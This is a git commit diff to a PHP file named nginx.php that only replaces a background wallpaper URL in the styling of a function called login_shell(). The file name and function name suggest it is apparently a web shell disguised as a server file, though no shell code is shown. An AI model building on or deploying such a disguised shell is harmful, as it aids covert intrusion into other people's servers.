7e60852be0fe76667f17a5a26ebbd5d846082ace
403xghost <403xghost@gmail.com>
2024-10-29 15:29:53 +0700

    Update nginx.php

--- nginx.php
+++ nginx.php
@@ -39,7 +39,7 @@ function login_shell() {
     <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.1/css/all.css"/>
     <style>
         body {
-            background-image: url('https://wallpapercave.com/uwp/uwp4009057.jpeg');
+            background-image: url('https://wallpapercave.com/wp/wp2700574.jpg');
             background-size: cover; /* Menutupi seluruh halaman */
             background-position: center; /* Memposisikan gambar di tengah */
             height: 100vh; /* Memastikan tinggi halaman 100% dari viewport */
